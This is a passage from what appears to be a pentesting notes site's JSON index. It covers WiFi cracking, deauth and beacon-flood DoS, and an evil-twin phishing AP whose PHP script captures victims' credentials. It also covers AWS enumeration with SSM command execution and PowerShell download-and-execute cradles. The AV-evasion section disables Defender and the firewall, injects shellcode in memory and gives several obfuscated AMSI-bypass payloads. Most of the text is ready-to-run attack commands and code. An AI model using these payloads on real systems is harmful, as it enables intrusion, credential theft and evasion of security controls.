--import passwd usr share wordlists rockyou.txt echo \"&lt;ESSID&gt;\" &gt; essid.lst airolib-ng passwords-airolib --import essid essid.lst airolib-ng passwords-airolib --stats #Test if all is working correctly airolib-ng passwords-airolib --clean all #Clean the wordlists to ileggible characters airolib-ng passwords-airolib --batch #Create the wordlists Onced created we just need to use aircrack aircrack-ng -r passwords-airolib_Capture-01.cap We can see that the speed of cracking of aircrack-ng goes from 10k s up to 200k s. Genpmk + (Cowpatty or Pyrit) First we need to create a new dictionary. genpmk -f usr share wordlists rockyou.txt -d dic.genpmk -s &lt;SSID&gt; And crackit with Cowpatty: cowpatty -d dic.genpmk -r Captura-01.cap -s &lt;ESSID&gt; #Up to 360k s More faster? try with Pyrit: pyrit -i dic.genpmk -e &lt;ESSID&gt; -r Captura-01.cap attack_cowpatty #Up to 2M s You still want to go faster? Try pyrit with Database: pyrit -i usr share wordlists rockyou.txt import_passwords pyrit -e &lt;ESSID&gt; create_essid pyrit batch #Finally attack pyrit -r Captura-01.cap attack_db #Up to 20M s DoS attacks CTS Frame Attack The protocol 802.11 is CSMA CA, CA is Collision Avoidance, so in that protocol appear two new types of packets. CTS (Clear to Send) and RTS (Request to Send) that provides to the network the ability to avoid collisions between frames. What happens if we flood the network with 1000 CTS frames with the time field on his maximum value (30.000 us), if we flood with that TCP stream we will hijack all the bandwidth causing a Denial of Service. First we need to capture and modify one Clear-to-send frame and modify the Duration to 30.000 us and modify the RA address. Onced created out evil frame we just need to send several times to the network. tcpreplay --intf1=&lt;IFACE&gt; --topspeed --loop=10000 evilframe.pcap 2&gt; dev null Actual: 10000 packets (460000 bytes) sent in 3.01 seconds Rated: 152428.1 Bps, 1.21 Mbps, 3313.65 pps Statistics for network device: wlx00c0caaba818 Successful packets: 10000 Failed packets: 0 Truncated packets: 0 Retried packets (ENOBUFS): 0 Retried packets (EAGAIN): 0 In that case we busy the channel for: Beacon Flood Mode Attack The beacon frame is a frame that contains information about the access point such as the channel where the AP is working, ciphers, protocols, etc. These type of beacons are transmitted in plain as other stations and devices need these frames to extract information in order to connect them. The idea of Beacon Flood Attack such as his name says, flood a large number of beacons in order to create a lot of ESSID in the same Chanel as the target AP in order to make it invisible for users. # Create a list of AP names: MyNetwork1 MyNetwork2 MyNetwork3 MyNetwork4 MyNetwork5 MyNetwork6 MyNetwork7 MyNetwork8 MyNetwork9 MyNetwork10 mdk3 &lt;IFACE&gt; b -f networks.txt -a -s 1000 -c &lt;CHANNEL&gt; # -a -&gt; WPA2 -s &lt;speed&gt; Michael Shutdown Explotation Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 injected QoS Data Packets, but less effective. mdk3 &lt;IFACE&gt; m -t &lt;BSSID&gt; Evil Twin One of the most common techniques to obtain the password of a wireless network via phishing. It’s common that the devices emit Probe Request frames when their are not associated to any AP. These Probe Request frame ares packets that contain information about which SSID the device was connected before. So we can abuse of that information in order to create a Fake AP with the same SSID. thark -i &lt;IFACE&gt; -Y \"wlan.fc.type_subtype==4\" 2&gt; dev null 1 0.000000000 Apple_7d:1f:e9 → Broadcast 802.11 195 Probe Request, SN=1063, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51 2 0.019968349 Apple_7d:1f:e9 → Broadcast 802.11 195 Probe Request, SN=1064, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51 Creating DHCP file etc dhcpd.conf authoritative; default-lease-time 600; max-lease-time 7200; subnet 192.168.1.128 netmask 255.255.255.128 { option subnet-mask 255.255.255.128; option broadcast-address 192.168.1.255; option routers 192.168.1.129; option domain-name-servers 8.8.8.8; range 192.168.1.130 192.168.1.140; } Configuring the web page (LOGIN ROUTER WIFI) Search and copy the html of a login webpage with the following action form: &lt;tr&gt;&lt;td&gt;&lt;form action=\"dbconnect.php\" method=\"post\"&gt; And the appropriate dbconnect.php &lt;?php session_start(); ob_start(); $host=\"localhost\"; $username=\"fakeap\"; $pass=\"fakeap\"; $dbname=\"evilTwin\"; $tbl_name=\"sniff\"; Create connection $conn = mysqli_connect($host, $username, $pass, $dbname); Check connection if (!$conn) { die(\"Connection failed: \" . mysqli_connect_error()); } $username=$_POST['username']; $password=$_POST['password']; $sql = \"INSERT INTO sniff (username, password) VALUES ('$username', '$password')\"; if (mysqli_query($conn, $sql)) { echo \"New record created successfully\"; } else { echo \"Error: \" . $sql . \"&lt;br&gt;\" . mysqli_error($conn); } mysqli_close($conn); sleep(2); header(\"location:upgrading.html\"); ob_end_flush(); ?&gt; Initializazing services We need to start apache2 and mysql service apache2 start &amp;&amp; service mysql start Configuring MySQL As we can see in dbconnect.php it’s trying to connect to a evilTwin db with fakeap user, so we just need to configure mysql properly. Creating the DB mysql -u root create database evilTwin; create table sniff(username varchar(32), password varchar(32)); show tables; +--------------------+ | Tables_in_evilTwin | +--------------------+ | wpakeys | +--------------------+ 1 row in set (0.00 sec) insert into sniff(username, password) values (\"TESTKEY\", \"TESTKEY\"); select * from sniff; +-----------+-----------+ | username | password | +-----------+-----------+ | TESTKEY | TESTKEY | +-----------+-----------+ 1 row in set (0.00 sec) Creating a user for the DB mysql -u root create user fakeap@localhost identified by 'fakeap'; grant all privileges on evilTwin.* to 'fakeap'@'localhost'; FLUSH PRIVILEGES; At this point onced we introduced credentials via the web panel, it will be appended in our database. Creating the AP With airbase we can set up our fake AP without authentication: airbase-ng -e &lt;ESSID&gt; -c &lt;CHANNEL&gt; -P &lt;IFACE&gt; Configuring a new network interface Onced launched our new fake AP, we need to add a new network interface. ifconfig at0 192.168.1.129 netmask 255.255.255.128 route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129 echo 1 &gt; proc sys net ipv4 ip_forward ifconfig at0 at0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.1.129 netmask 255.255.255.128 broadcast 192.168.1.255 inet6 fe80::e670:b8ff:fed3:935c prefixlen 64 scopeid 0x20&lt;link&gt; ether e4:70:b8:d3:93:5c txqueuelen 1000 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 57 bytes 8828 (8.6 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Configuring IP tables The idea is to redirect the traffic coming from victims from at0 to eth0 in order to give them connection to internet. iptables --flush iptables --table nat --flush iptables --delete-chain iptables --table nat --delete-chain iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE iptables --append FORWARD --in-interface at0 -j ACCEPT iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80 iptables -t nat -A POSTROUTING -j MASQUERADE Syncronize Finally the last step is syncronize our rules to the fake AP. dhcpd -cf etc dhcpd.conf -pf var run dhcp.pid at0 Attacks without Clients In this section we are not going to capture any type of handshake to obtain the hash or key. We are goin to attack the network in a client-less mode. PKMID Attack This attack allows us to break the technology using Pairwise Master Key Identifier (PKMID) which is a characteristic available in a lot of devices. Via Bettercap The results will be exported on a pcap file. bettercap -iface &lt;IFACE&gt; iface &gt;&gt; wifi.recon on iface &gt;&gt; wifi.show iface &gt;&gt; wifi.assoc all Via hcxdumptool Same as bettercap, the results will be exported on a pcap file. hcxdumptool -i &lt;IFACE&gt; -o &lt;OUT_FILE&gt; --enable_status=1 Export results fo hashcat &amp;&amp; Cr4ck it! Using hcxpcaptool we can easily transform the output of bettercap or hcxdumptool to hashcat. hcxpcaptool -z hashes.hash Capture.pcap hashcat -m 16800 -d 1 -w 3 hashesh.hash usr share wordslist rockyou.txt WPS Attack Wifi Protected Setup aka WPS is a wireless network security standard that tries to make connections between a router and devices faster and easier. WPSPinGenerator is an automatic tool available in Wifislax. First we need to choose the interface to work with and the channels where we want to listen. We can see the generic PINS if they are available on the network by selection the suitable SSID. Finally we just need to test the PIN and wait for success. Noticed that after 3 fail attempts the WPS could lock."
					}

					
				
			
		
			
				
					,
					

					"other-hacking-aws": {
						"id": "other-hacking-aws",
						"title": "Hacking AWS",
						"category": "",
						"url": " /other/hacking-aws/",
						"content": "Amazon Web Services is a subsidiary of Amazon providing on-demand cloud computing platforms and APIs. AWSCLI Configuration You can get your credential here https: console.aws.amazon.com iam home?# security_credential but you need an aws account, free tier account : https: aws.amazon.com s dm optimization server-side-test free-tier free_np aws configure --profile &lt;PROFILE_NAME&gt; AWSAccessKeyId= &lt;AccessKeyID&gt; AWSSecretKey= &lt;SecretKey&gt; Default Region Name= &lt;Region&gt; Default Output Format = &lt;json or text&gt; Or you can configure the default one stored in ~ .aws credentials: aws configure EC2 Amazon Elastic Compute Cloud (Amazon EC2) provides secure and resizable computing capacity in the AWS cloud. Using Amazon EC2 eliminates the need to invest in hardware up front, so you can develop and deploy applications faster. To resume an EC2 is a virtual machine. SSH keys are created when started to connect to linux devices, for windows it uses RDP. Exists security groups to handle open ports and allowed IPs. aws ec2 describe-instances STS AWS Security Token Service (STS) enables you to request temporary, limited-privileges credentials for AWS IAM users or for users that you authenticate. Identify the token $ aws sts get-caller-identity { \"UserId\": \"AROAxxxxxxxxxxxxxxxxx:i-xxxxxxxxxxxxxxxxx\", \"Account\": \"19xxxxxxxxxx\", \"Arn\": \"arn:aws:sts::19xxxxxxxxxx:assumed-role webserver i-xxxxxxxxxxxxxxxxx\" } Get Key Info aws sts get-session-token IAM AWS Identity and Access Management (IAM) is a web service for securely controlling access to AWS services. With IAM, you can centrally manage users, security credentials such as access keys, and permissions that control which AWS resources users and applications can access. aws iam get-account-password-policy aws iam list-users aws iam list-roles aws iam list-access-keys --user-name &lt;user&gt; aws iam create-access-key --user-name &lt;user&gt; aws iam list-attached-user-policies --user-name &lt;user&gt; aws iam get-policy aws iam get-policy-version SSM AWS System Manager is a collection of capabilities that helps you automate management tasks such as collecting system inverntory, applying OS patches, automating the creation of AMIs. Systems Manager lets you remotely and securely manage the configuration of your managed instances. A managed instance is any EC2 instance or any on-premise server or VM. Check instances are accepted for executing commands $ aws ssm describe-instance-information --output text --query \"InstanceInformationList[*]\" 1.2.3.4 example-1234567890.eu-west-1.elb.amazonaws.com 172.10.1.100 i-xxxxxxxxxxxxxxxxx False 2021-02-05T13:37:00.000000+01:00 Online Amazon Linux AMI Linux 2020.01 EC2Instance Send Command Copy the CommandId of the output for later usage. $ aws ssm send-command --document-name \"AWS-RunShellScript\" --comment \"RCE test: whoami\" --targets \"Key=instanceids,Values=[instanceid]\" --parameters 'commands=whoami' { \"Command\": { \"CommandId\": \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\", \"DocumentName\": \"AWS-RunShellScript\", \"DocumentVersion\": \"\", \"Comment\": \"RCE test: whoami\", \"ExpiresAfter\": \"2021-02-05T13:37:00.000000+01:00\", \"Parameters\": { \"commands\": [ \"whoami\" ] }, \"InstanceIds\": [], \"Targets\": [ { \"Key\": \"instanceids\", \"Values\": [ \"i-xxxxxxxxxxxxxxxxx\" ] } ], \"RequestedDateTime\": \"2021-02-05T13:37:00.000000+01:00\", \"Status\": \"Pending\", \"StatusDetails\": \"Pending\", \"OutputS3BucketName\": \"\", \"OutputS3KeyPrefix\": \"\", \"MaxConcurrency\": \"50\", \"MaxErrors\": \"0\", \"TargetCount\": 0, \"CompletedCount\": 0, \"ErrorCount\": 0, \"DeliveryTimedOutCount\": 0, \"ServiceRole\": \"\", \"NotificationConfig\": { \"NotificationArn\": \"\", \"NotificationEvents\": [], \"NotificationType\": \"\" }, \"CloudWatchOutputConfig\": { \"CloudWatchLogGroupName\": \"\", \"CloudWatchOutputEnabled\": false }, \"TimeoutSeconds\": 3600 } } Check command output With the previous CommandId check the output. If the command didn’t finish yet, the Status will be shown as pending. $ aws ssm list-command-invocations --command-id \"[CommandId]\" --details { \"CommandInvocations\": [ { \"CommandId\": \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\", \"InstanceId\": \"i-xxxxxxxxxxxxxxxxx\", \"InstanceName\": \"\", \"Comment\": \"RCE test: whoami\", \"DocumentName\": \"AWS-RunShellScript\", \"DocumentVersion\": \"\", \"RequestedDateTime\": \"2021-02-05T13:37:00.000000+01:00\", \"Status\": \"Success\", \"StatusDetails\": \"Success\", \"StandardOutputUrl\": \"\", \"StandardErrorUrl\": \"\", \"CommandPlugins\": [ { \"Name\": \"aws:runShellScript\", \"Status\": \"Success\", \"StatusDetails\": \"Success\", \"ResponseCode\": 0, \"ResponseStartDateTime\": \"2021-02-05T13:37:00.000000+01:00\", \"ResponseFinishDateTime\": \"2021-02-05T13:37:00.000000+01:00\", \"Output\": \"root\\n\", \"StandardOutputUrl\": \"\", \"StandardErrorUrl\": \"\", \"OutputS3Region\": \"eu-west-1\", \"OutputS3BucketName\": \"\", \"OutputS3KeyPrefix\": \"\" } ], \"ServiceRole\": \"\", \"NotificationConfig\": { \"NotificationArn\": \"\", \"NotificationEvents\": [], \"NotificationType\": \"\" }, \"CloudWatchOutputConfig\": { \"CloudWatchLogGroupName\": \"\", \"CloudWatchOutputEnabled\": false } } ] } When the command is succcessfully executed the output is shown in: CommandInvocations.CommandPlugins.Output S3 Buckets Amazon Simple Storage Service as known as S3 Bucket has a simple web services interface that you can use to store and retrieve any amount of data, at any time, from anywhere on the web. Search for S3 Buckets We need to identify if the service running is a s3. http: s3.amazonaws.com [bucket_name] http: [bucket_name].s3.amazonaws.com You can get the region of a bucket with a dig and nslookup: $ dig flaws.cloud ;; ANSWER SECTION: flaws.cloud. 5 IN A 52.218.192.11 $ nslookup 52.218.192.11 Non-authoritative answer: 11.192.218.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com. Enumeration We will use aws-cli tool Use --no-sign-request for check Everyones permissions Use --profile &lt;PROFILE_NAME&gt; to indicate the previous configuration profile. Search Buckets inside the same host: aws s3 ls --endpoint-url http: s3.DOMAIN.COM --no-sign-request List content of a bucket: aws s3 ls s3: BUCKET-NAME --endpoint-url http: s3.DOMAIN.COM --no-sign-request Copy content: aws s3 cp tmp FILE s3: BUCKET-NAME --endpoint-url http: s3.DOMAIN.COM --no-sign-request DynamoDB Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It’s a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. List tables aws dynamodb list-tables --endpoint-url http: s3.DOMAIN.COM { \"TableNames\": [ \"TABLENAME\" ] } Get Table Content aws dynamodb scan --table-name TABLENAME --endpoint-url http: s3.DOMAIN.COM { \"Items\": [ { \"password\": { \"S\": \"PWD@#1@#\" }, \"username\": { \"S\": \"USER3\" } }, { \"password\": { \"S\": \"PWD!\" }, \"username\": { \"S\": \"USER2\" } }, { \"password\": { \"S\": \"PWD\" }, \"username\": { \"S\": \"USER1\" } } ], \"Count\": 3, \"ScannedCount\": 3, \"ConsumedCapacity\": null } Create Table aws dynamodb create-table --table-name TABLENAME--attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --endpoint-url http: s3.DOMAIN.COM Create Item aws dynamodb update-item --table-name TABLENAME--key file: FILE.json --endpoint-url http: s3.DOMAIN.COM # where FILE.json is: { \"title\": {\"S\": \"TITLECONTENT\"}, \"data\": {\"S\": \"DATACONTENT\"} } References https: book.hacktricks.xyz pentesting pentesting-web buckets aws-s3 https: docs.aws.amazon.com cli latest reference dynamodb index.html https: sanderwind.medium.com escalating-ssrf-to-rce-7c0147371c40 https: github.com six2dez pentest-book blob dd75c8af72e4906593c744a3aacc4888d7c04430 enumeration cloud aws.md#basic-commands-1"
					}

					
				
			
		
			
				
					,
					

					"other-hacking-with-powershell": {
						"id": "other-hacking-with-powershell",
						"title": "Hacking with PowerShell",
						"category": "",
						"url": " /other/hacking-with-powershell/",
						"content": "Basic explanation about what is Powershell and how we can use it in out hacking days. What is Powershell? Powershell is the Windows Scripting Language and shell environment that is built using the .NET Framework. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects, making Powershell somewhat object oriented. Note: The normal format of cmdlet is represented using Verb-Noun. Ex: Get-Command Common verbs used are the following ones: Get Start Stop Read Write New Out Using Get-Help Get-Help displays information about a cmdlet. To get help about a particular command, run the following: Get-Help cmdlet Get-Help cmdlet -Full Get-Help cmdlet -Examples Note: To show some examples execute Get-Help cmdlet -Examples Using Get-Command Get-Command gets all the cmdlets installed on the current Computer. Running Get-Command Verb-* or Get-Command *-Noun filters the search. Object Manipulation If we want to actually maniputare the output, we need to figure out a few things: Passing output to other cmdlets. Using specific object cmdlets to extract information. To pas the output to another cmdlet like bash scripting is with the Pipeline “|”. Verb-Noun | Get-Member -MemberType Equals Creating Objects From Previous cmdlets One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet. Get-ChildItem | Select-Object -Property Mode, Name Filtering Objects When retrieving output objects, you may want to select objects that match a very specific value. You can do that using the Where-Object. Verb-Noun | Where-Object -Property PropertyName -operator Value Verb-Noun | Where-Object {$_.PropertyName -operator Value} This are the following operators: -like: Contains but not exact. -contains: Exact match for the specified value. -eq: Equals to. -gt: Greater than. Sort Objects May you need to sort the output of a cmdlet in order to extract the information more efficiently. You can do this with Sort-Object cmdlet. Verb-Noun | Sort-Object Importing modules It is also posible to import our self modules. Import-Module &lt;modulepath&gt;.ps1 . . &lt;modulepath&gt;.ps1 Onced imported we can list all commands that we previously imported. Get-Command -Module &lt;modulename&gt; Encoded Command We can use a Base64 payload to avoid problems with of notation or quotes. We can use parameters -EncodedCommand or -enc to specify that the payload will be encoded. We need to use Unicode encoding instead of UTF-8 or ASCII at base64 conversion. PowerShell: $str = 'IEX ((new-object net.webclient).downloadstring(\"http: 10.10.10.10 a\"))' [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) Bash: str='IEX ((new-object net.webclient).downloadstring(\"http: 10.10.10.10 a\"))' echo -en $str | iconv -t UTF-16LE | base64 -w 0"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-ata-evasion": {
						"id": "post-exploitation-ata-evasion",
						"title": "ATA Evasion",
						"category": "",
						"url": " /post-exploitation/ata-evasion/",
						"content": "Advanced Threat Analytics (ATA) is an on-premises platform that helps protect your enterprise from multiple types of advanced targeted cyber attacks and insider threats. How ATA works ATA leverages a proprietary network parsing engine to capture and parse network traffic of multiple protocols (such as Kerberos, DNS, RPC, NTLM, and others) for authentication, authorization, and information gathering. This information is collected by ATA via: Port mirroring from Domain Controllers and DNS servers to the ATA Gateway and or Deploying an ATA Lightweight Gateway (LGW) directly on Domain Controllers ATA takes information from multiple data-sources, such as logs and events in your network, to learn the behavior of users and other entities in the organization, and builds a behavioral profile about them. ATA can receive events and logs from: SIEM Integration Windows Event Forwarding (WEF) Directly from the Windows Event Collector (for the Lightweight Gateway) For more information on ATA architecture, see ATA Architecture. Evading ATA It is posible to evade or make less noise while our red teams engagements. Apart from the LM NT hashes, the Kerberos keys, derived from the user password and used in the Kerberos authentication protocol, are stored. The Kerberos keys can be used to ask for a Kerberos ticket that represents the user in Kerberos authentication. There are several different keys, and different ones are used for different Kerberos encryption support: AES 256 key Used by the AES256-CTS-HMAC-SHA1-96 algorithm. This is the one commonly used by Kerberos, and the one a pentester should use in order to avoid triggering alarms. AES 128 key: Used by the AES128-CTS-HMAC-SHA1-96 algorithm. DES key: Used by the deprecated DES-CBC-MD5 algorithm. RC4 key: This is the NT hash of the user used by the RC4-HMAC algorithm."
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-av-evasion": {
						"id": "post-exploitation-av-evasion",
						"title": "AV Evasion",
						"category": "",
						"url": " /post-exploitation/av-evasion/",
						"content": "Antivirus or AV is a kind of software used to prevent, scan, detect and delete malware from a computer. During our assessments there are a lot of tools such as meterpreter, mimikatz, etc that are flagged as a malware. So in order to perform our work properly we need to bypass the AV. Some interesting websites or programs that will help us to determine if our binary script is flagged as a malware: https: antiscan.me https: github.com RythmStick AMSITrigger https: github.com matterpreter DefenderCheck Deactivate Antivirus and Firewall Antivirus Check status: Get-MpComputerStatus Need NT AUTHORITY SYSTEM rights if the UAC is enabled. Stop Real-time procetions and AMSI: Set-MpPreference -DisableRealtimeMonitoring $true Set-MpPreference -DisableIOAVProtection $true net stop WinDefend If it is not possible login via RDP with an Administrator user and disable it manually. Firewall Disable firewall by executing: netsh advfirewall set allprofiles state off Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False String Replacement String Replacement is one of the oldest techniques. Antivirus makes use of signatures, if we replace the name of: variables functions more over We can modify the signatures in order to bypass the AV. Read more: https: s3cur3th1ssh1t.github.io Building-a-custom-Mimikatz-binary https: s3cur3th1ssh1t.github.io Customizing_C2_Frameworks Obfuscation Obfuscate is the action of amking something obscure, unclear or unintelligible. Invoke-Obfuscation Invoke-Obfuscation is a PowerShell v2.0+ compatible PowerShell command and script obfuscator. https: github.com danielbohannon Invoke-Obfuscation Import-Module . Invoke-Obfuscation.psd1 Invoke-Obfuscation set SCRIPTBLOCK \"iex (New-Object System.Net.Webclient).DownloadString('http: localhost script.ps1);Invoke-Kapokatz.ps1 -DumpCreds\" ENCODING 5 Result: inVoKe-EXPRESSiOn ( ([rUNTiME.iNteRopsERViCEs.marshAl]::ptRTosTriNGaUto( [RuNtIMe.InteRopSErviCEs.marshaL]::seCuREsTrinGtobsTr($('76492d1116743f0423413b16050a5345MgB8AC8AagB1AEwAbQBnAGEAcgBSAE0AUQBSADYAWQA1AHIAeQBPAHEATwBQAEEAPQA9AHwAOABlAGUAYQBmAGUAZQBjAGYAOAA5AGEAMAAxADMAYQA1ADcAMQA3AGYAZgA0ADQAMQA3AGIAMAA1ADAANwBjAGUAMwBiAGQANAAwAGYAMQAyADQANQBkAGEAZABmADcANAAwADgAYgBjAGMANAA3AGYAMQA1ADAANgBjADAANgBmADEAYwA4ADEANABlAGEANQA4ADAANABkADgAYwA4ADIAOAA3AGMAMABkAGMAYwBlAGEAYwA3AGQAMwA4ADcAMAAzADQAYgA2AGQAOAA0ADYAYQAwADIAZABiADQAYQA1ADEAZgBlAGMANgBmAGYAOAA4ADMAMABlAGQAMwA1AGIAZAA1AGEAMwA4ADkAYgAyADAANgAyAGEAYQAzADcAMQBhADUAYQBmAGQAOAAwADcAOQA0AGUAZgA1ADYANQA3AGQAZgAzADIAMgBhAGUAMAA2ADAAYgAxADgAYwBhAGUAYwBjAGUAMABlADMAZABkADYAMAAxADYAZQA0ADcANABiADAAZgA4ADEAYQA0AGEAZgA5ADQANAAwADcAOQBlADkAMgAyADcAZgBiAGEAZQBkADkAMAA0AGUAOQA3ADEAMwAwAGIANgAzADgANwBmADgANQAzAGQANQBiAGEANwBmAGMANQAzAGIAYwBlADYAOABlADgANwA2ADcAZQA0AGYANQBiADMAMwBkAGIAOQA1ADQAMgA5ADYAOAA5ADgANgBmADEANgAxADIAMwBjAGMAOABhADAAZQAwADEAOABlAGUAMAA5ADEAMgBjAG'))))) Invoke-CradleCrafter Invoke-CradleCrafter is very useful for implementing obfuscation. https: github.com danielbohannon Invoke-CradleCrafter More info in : https: www.danielbohannon.com blog-1 2017 12 2 the-invoke-cradlecrafter-overview In-Memory Injection Template A basic template script that performs in-memory injection: $code = ' [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport(\"msvcrt.dll\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);'; $winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru; [Byte[]]; # msfvenom -p windows shell_reverse_tcp LHOST=&lt;ip_addr&gt; LPORT=&lt;port&gt; -f powershell [Byte[]]$sc = &lt;place your shellcode here&gt;; $size = 0x1000; if ($sc.Length -gt 0x1000) {$size = $sc.Length}; $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40); for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}; $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 }; Powershell Scripts We can download and execute a script without saving it on disk. This is a powerful tool because we prevent the antivirus from scanning our file. iex (New-Object System.Net.Webclient).DownloadString('http: ip-addr:port file.ps1') iex (iwr 'http: ip-addr:port file.ps1') Since this technique was appear, windows implemented the AMSI (Antimalware Scan Interface) as a method to defend from malware during execution. So we need to bypass it. Invoke-ReflectivePEInjection.ps1 With Invoke-ReflectivePEInjection.ps1 from PowerSploit we can convert a dll or exe binary to a PowerShell script. https: powersploit.readthedocs.io en latest CodeExecution Invoke-ReflectivePEInjection We just need to convert our exe to base64 in order to hardcode it in a PowerShell script. $PEBytes = [IO.File]::ReadAllBytes('C:\\Windows\\Temp\\binary.exe') $b64 = [System.Convert]::ToBase64String($PEBytes) Finally we just need to append the following code in the Invoke-ReflectivePEInjection.ps1. $b64 = \"BASE64-BINARY-CHANGEME\" $PEBytes = [System.Convert]::FromBase64String($b64) Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs \"Arg1 Arg2 Arg3\" Note: Sometimes arguments doesn’t work so maybe you need to harcode the arguments on the binary and recompile it. Example of hardcoding arguments on PrintSpoofer (c++): BOOL g_bInteractWithConsole FALSE; wchar_t commad[] = L\"cmd.exe\"; LPWSTR g_pwszCommandLine = command; If and error like that occurs Exception calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\" Try to replace the following line: $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress') To: $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] \"Public,Static\", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null); AMSI bypass Microsoft has developed AMSI (Antimalware Scan Interface) as a method to defend against common malware execution and protect the end user. By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution to prevent arbitrary execution of code. When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. These two API’s are used by the AV to scan the buffer and strings searching signatures from malware. AmsiScanBuffer() AmsiScanString() If a known signature is identified during execution does not initate and a message appears that the script has been blocked during execution by the antivirus. Even though some of the techniques in their original state are blocked, modification of strings, variables and functions, encoding and obfuscation could revive even the oldest tactics. PowerShell Downgrade Even though that Windows PowerShell 2.0 is deprecated, in some devices it hasn’t been removed. Older versions of PowerShell does not contain security controls such as AMSI. powershell -version 2 Set “amsiInitFailed” flag Setting the amsiInitFailed flag prevents the AMSI scanning capability for the current process: Original Payload: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) Base64 Encoded Payload: [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true) Obfuscated Payload: sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),( \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"( ${n`ULl},${t`RuE} ) S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' )).\"sE`T`VaLUE\"( ${n`ULl},${t`RuE} ) Alternative Payload with the usage of variables: $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils' $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)) $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static') $field.SetValue($null,$true) Not detected by auto logging [Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\"-as[String].Assembly.GetType('System.T'+'ype')),[Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as[String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True) We can find more payloads on the following webpage: https: amsi.fail Hooking Exists a proof of concept of hokking into the AmsiScanBuffer function with a DLL. The AmsiScanBuffer function will be executed with dummy parameters. .\\SimpleInjector.exe 